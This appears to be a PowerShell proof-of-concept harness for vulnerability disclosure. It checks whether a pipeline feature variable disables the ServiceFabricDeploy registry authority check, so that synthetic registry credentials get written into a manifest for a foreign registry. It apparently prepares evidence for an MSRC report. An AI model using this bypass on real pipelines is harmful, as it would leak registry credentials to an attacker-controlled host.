[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [string] $ProductRoot,

    [Parameter(Mandatory = $true)]
    [string] $TaskLibRoot,

    [Parameter(Mandatory = $true)]
    [string] $EvidenceDir
)

$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'

$ProductRoot = [System.IO.Path]::GetFullPath($ProductRoot)
$TaskLibRoot = [System.IO.Path]::GetFullPath($TaskLibRoot)
$EvidenceDir = [System.IO.Path]::GetFullPath($EvidenceDir)
New-Item -ItemType Directory -Force -Path $EvidenceDir | Out-Null

$featureName = 'ServiceFabricDeploy.DisableRegistryAuthorityCheck'
$fullVariableName = "DistributedTask.Tasks.$featureName"
$featureEnvironmentName = $fullVariableName.Replace('.', '_').ToUpperInvariant()
$syntheticUser = 'R81_SYNTHETIC_REGISTRY_USER'
$syntheticSecret = 'R81_SYNTHETIC_REGISTRY_SECRET_7F92D0'
$trustedRegistry = 'trusted.azurecr.io'
$foreignRegistry = 'foreign-r81.invalid'

function global:Get-LocString {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string] $Key,
        [object[]] $ArgumentList
    )

    if ($ArgumentList) {
        return "$Key|$($ArgumentList -join '|')"
    }
    return $Key
}

# Load the actual task-lib implementation that maps
# DistributedTask.Tasks.<FeatureName> to an ordinary environment variable.
$inputFunctionsPath = Join-Path $TaskLibRoot 'powershell\VstsTaskSdk\InputFunctions.ps1'
if (-not (Test-Path -LiteralPath $inputFunctionsPath -PathType Leaf)) {
    throw "Pinned task-lib InputFunctions.ps1 not found: $inputFunctionsPath"
}
. $inputFunctionsPath
Set-Alias -Name Get-VstsPipelineFeature -Value Get-PipelineFeature -Scope Global -Force

$global:R81Inputs = @{
    registryCredentials = 'ContainerRegistryEndpoint'
    dockerRegistryEndpoint = 'R81_SYNTHETIC_ENDPOINT'
}
$global:R81Endpoint = [pscustomobject]@{
    Url = "https://$trustedRegistry"
    Data = [pscustomobject]@{
        registrytype = 'Generic'
    }
    Auth = [pscustomobject]@{
        Scheme = 'UsernamePassword'
        Parameters = [pscustomobject]@{
            UserName = $syntheticUser
            Password = $syntheticSecret
            registry = $trustedRegistry
        }
    }
}

function global:Get-VstsInput {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string] $Name,
        [switch] $Require
    )

    if ($global:R81Inputs.ContainsKey($Name)) {
        return [string]$global:R81Inputs[$Name]
    }
    if ($Require) {
        throw "R81_MISSING_SYNTHETIC_INPUT:$Name"
    }
    return ''
}

function global:Get-VstsEndpoint {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string] $Name,
        [switch] $Require
    )

    if ($Name -eq 'R81_SYNTHETIC_ENDPOINT') {
        return $global:R81Endpoint
    }
    if ($Require) {
        throw "R81_MISSING_SYNTHETIC_ENDPOINT:$Name"
    }
    return $null
}

function global:Get-VstsLocString {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string] $Key,
        [object[]] $ArgumentList
    )

    if ($ArgumentList) {
        return "$Key|$($ArgumentList -join '|')"
    }
    return $Key
}

function global:Trace-VstsEnteringInvocation { param($Invocation) }
function global:Trace-VstsLeavingInvocation { param($Invocation) }

$modulePath = Join-Path $ProductRoot 'Tasks\ServiceFabricDeployV1\Update-DockerSettings.psm1'
if (-not (Test-Path -LiteralPath $modulePath -PathType Leaf)) {
    throw "Pinned ServiceFabricDeploy product module not found: $modulePath"
}
Import-Module -Name $modulePath -Force -DisableNameChecking

function New-R81Package {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string] $Root,
        [Parameter(Mandatory = $true)]
        [string] $ImageName
    )

    if (Test-Path -LiteralPath $Root) {
        Remove-Item -LiteralPath $Root -Recurse -Force
    }
    New-Item -ItemType Directory -Force -Path (Join-Path $Root 'ServicePkg') | Out-Null

    $applicationManifest = @"
<?xml version="1.0" encoding="utf-8"?>
<ApplicationManifest ApplicationTypeName="R81SyntheticApp" ApplicationTypeVersion="1.0.0" xmlns="http://schemas.microsoft.com/2011/01/fabric">
  <ServiceManifestImport>
    <ServiceManifestRef ServiceManifestName="ServicePkg" ServiceManifestVersion="1.0.0" />
  </ServiceManifestImport>
</ApplicationManifest>
"@

    $serviceManifest = @"
<?xml version="1.0" encoding="utf-8"?>
<ServiceManifest Name="ServicePkg" Version="1.0.0" xmlns="http://schemas.microsoft.com/2011/01/fabric">
  <ServiceTypes>
    <StatelessServiceType ServiceTypeName="R81SyntheticType" />
  </ServiceTypes>
  <CodePackage Name="Code" Version="1.0.0">
    <EntryPoint>
      <ContainerHost>
        <ImageName>$ImageName</ImageName>
      </ContainerHost>
    </EntryPoint>
  </CodePackage>
</ServiceManifest>
"@

    Set-Content -LiteralPath (Join-Path $Root 'ApplicationManifest.xml') -Value $applicationManifest -Encoding utf8NoBOM
    Set-Content -LiteralPath (Join-Path $Root 'ServicePkg\ServiceManifest.xml') -Value $serviceManifest -Encoding utf8NoBOM
}

function Get-R81CredentialEvidence {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string] $ApplicationManifestPath
    )

    [xml]$xml = Get-Content -LiteralPath $ApplicationManifestPath -Raw
    $nodes = @($xml.SelectNodes("//*[local-name()='RepositoryCredentials']"))
    $records = @()
    foreach ($node in $nodes) {
        $records += [pscustomobject]@{
            AccountName = $node.GetAttribute('AccountName')
            Password = $node.GetAttribute('Password')
            PasswordEncrypted = $node.GetAttribute('PasswordEncrypted')
            ParentCodePackageRef = $node.ParentNode.GetAttribute('CodePackageRef')
        }
    }

    return [pscustomobject]@{
        Count = $records.Count
        Records = $records
        SyntheticSecretPresent = [bool]($records | Where-Object { $_.Password -ceq $syntheticSecret })
        SyntheticUserPresent = [bool]($records | Where-Object { $_.AccountName -ceq $syntheticUser })
    }
}

function Invoke-R81Trial {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string] $Name,
        [Parameter(Mandatory = $true)]
        [string] $ImageName,
        [Parameter(Mandatory = $true)]
        [bool] $FeatureEnabled
    )

    $trialRoot = Join-Path $EvidenceDir "trial-$Name"
    New-R81Package -Root $trialRoot -ImageName $ImageName

    Remove-Item -LiteralPath "Env:$featureEnvironmentName" -ErrorAction SilentlyContinue
    if ($FeatureEnabled) {
        Set-Item -LiteralPath "Env:$featureEnvironmentName" -Value 'true'
    }

    $featureValueReadByOfficialTaskLib = [bool](Get-PipelineFeature -FeatureName $featureName)
    $exception = $null
    try {
        Update-DockerSettings `
            -ApplicationPackagePath $trialRoot `
            -ClusterConnectionParameters @{} `
            -ApplicationParameter @{}
    }
    catch {
        $exception = [pscustomobject]@{
            Type = $_.Exception.GetType().FullName
            Message = $_.Exception.Message
            FullyQualifiedErrorId = $_.FullyQualifiedErrorId
        }
    }

    $applicationManifestPath = Join-Path $trialRoot 'ApplicationManifest.xml'
    $credentialEvidence = Get-R81CredentialEvidence -ApplicationManifestPath $applicationManifestPath
    $manifestText = Get-Content -LiteralPath $applicationManifestPath -Raw
    $manifestSha256 = (Get-FileHash -LiteralPath $applicationManifestPath -Algorithm SHA256).Hash.ToLowerInvariant()

    return [pscustomobject]@{
        Name = $Name
        ImageName = $ImageName
        FeatureRequested = $FeatureEnabled
        FeatureEnvironmentName = $featureEnvironmentName
        FeatureEnvironmentValue = if ($FeatureEnabled) { 'true' } else { $null }
        FeatureValueReadByOfficialTaskLib = $featureValueReadByOfficialTaskLib
        Exception = $exception
        CredentialEvidence = $credentialEvidence
        ManifestSha256 = $manifestSha256
        Manifest = $manifestText
    }
}

$sourceIdentity = [pscustomobject]@{
    ProductModulePath = $modulePath
    ProductModuleSha256 = (Get-FileHash -LiteralPath $modulePath -Algorithm SHA256).Hash.ToLowerInvariant()
    TaskLibInputFunctionsPath = $inputFunctionsPath
    TaskLibInputFunctionsSha256 = (Get-FileHash -LiteralPath $inputFunctionsPath -Algorithm SHA256).Hash.ToLowerInvariant()
    FeatureName = $featureName
    FullVariableName = $fullVariableName
    EnvironmentName = $featureEnvironmentName
    PowerShell = $PSVersionTable.PSVersion.ToString()
    OperatingSystem = [System.Environment]::OSVersion.VersionString
}

$trials = @(
    Invoke-R81Trial -Name 'foreign-default' -ImageName "$foreignRegistry/team/sidecar:1" -FeatureEnabled $false
    Invoke-R81Trial -Name 'foreign-flag' -ImageName "$foreignRegistry/team/sidecar:1" -FeatureEnabled $true
    Invoke-R81Trial -Name 'matching-default' -ImageName "$trustedRegistry/team/app:1" -FeatureEnabled $false
)

Remove-Item -LiteralPath "Env:$featureEnvironmentName" -ErrorAction SilentlyContinue

$foreignDefault = $trials | Where-Object Name -eq 'foreign-default'
$foreignFlag = $trials | Where-Object Name -eq 'foreign-flag'
$matchingDefault = $trials | Where-Object Name -eq 'matching-default'

$gates = [ordered]@{
    OfficialTaskLibReadsFalseByDefault = ($foreignDefault.FeatureValueReadByOfficialTaskLib -eq $false)
    OfficialTaskLibReadsTrueFromOrdinaryVariable = ($foreignFlag.FeatureValueReadByOfficialTaskLib -eq $true)
    ForeignRegistryRejectedByDefault = ($null -ne $foreignDefault.Exception -and $foreignDefault.Exception.Message -match 'RegistryAuthorityMismatch')
    ForeignRegistryDefaultDoesNotReceiveSecret = (-not $foreignDefault.CredentialEvidence.SyntheticSecretPresent)
    MatchingRegistryAcceptedByDefault = ($null -eq $matchingDefault.Exception)
    MatchingRegistryReceivesSyntheticSecret = ($matchingDefault.CredentialEvidence.SyntheticSecretPresent -and $matchingDefault.CredentialEvidence.SyntheticUserPresent)
    FlaggedForeignRegistryAccepted = ($null -eq $foreignFlag.Exception)
    FlaggedForeignRegistryReceivesSyntheticSecret = ($foreignFlag.CredentialEvidence.SyntheticSecretPresent -and $foreignFlag.CredentialEvidence.SyntheticUserPresent)
}

$controlGateNames = @(
    'OfficialTaskLibReadsFalseByDefault',
    'OfficialTaskLibReadsTrueFromOrdinaryVariable',
    'ForeignRegistryRejectedByDefault',
    'ForeignRegistryDefaultDoesNotReceiveSecret',
    'MatchingRegistryAcceptedByDefault',
    'MatchingRegistryReceivesSyntheticSecret'
)
$controlsPassed = -not [bool]($controlGateNames | Where-Object { -not $gates[$_] })
$runtimePositive = $controlsPassed -and $gates.FlaggedForeignRegistryAccepted -and $gates.FlaggedForeignRegistryReceivesSyntheticSecret

$status = if ($runtimePositive) {
    'OFFICIAL_TASK_RUNTIME_POSITIVE_AZDO_ACTOR_GATE_REQUIRED'
}
elseif (-not $controlsPassed) {
    'INVALID_RUNTIME'
}
else {
    'RUNTIME_NEGATIVE_CLOSED'
}

$result = [ordered]@{
    Schema = 'r81-servicefabric-feature-flag-bypass/v1'
    Status = $status
    RuntimePositive = $runtimePositive
    ControlsPassed = $controlsPassed
    SourceIdentity = $sourceIdentity
    SecurityClaimLimit = 'This local official-code gate proves feature-variable reachability and synthetic credential injection only. A restricted-actor Azure DevOps hosted run is still required before any MSRC submission.'
    SyntheticOnly = $true
    Gates = $gates
    Trials = $trials
}

$resultPath = Join-Path $EvidenceDir 'result.json'
$result | ConvertTo-Json -Depth 20 | Set-Content -LiteralPath $resultPath -Encoding utf8NoBOM

$summaryLines = @(
    "status=$status",
    "runtimePositive=$runtimePositive",
    "controlsPassed=$controlsPassed"
)
foreach ($key in $gates.Keys) {
    $summaryLines += "gate.$key=$($gates[$key])"
}
$summaryLines | Set-Content -LiteralPath (Join-Path $EvidenceDir 'summary.txt') -Encoding utf8NoBOM

$hashLines = Get-ChildItem -LiteralPath $EvidenceDir -File -Recurse |
    Where-Object Name -ne 'SHA256SUMS.txt' |
    Sort-Object FullName |
    ForEach-Object {
        $relative = [System.IO.Path]::GetRelativePath($EvidenceDir, $_.FullName).Replace('\\', '/')
        $hash = (Get-FileHash -LiteralPath $_.FullName -Algorithm SHA256).Hash.ToLowerInvariant()
        "$hash  $relative"
    }
$hashLines | Set-Content -LiteralPath (Join-Path $EvidenceDir 'SHA256SUMS.txt') -Encoding ascii

$result | ConvertTo-Json -Depth 20

if ($runtimePositive) {
    exit 10
}
if (-not $controlsPassed) {
    exit 2
}
exit 0
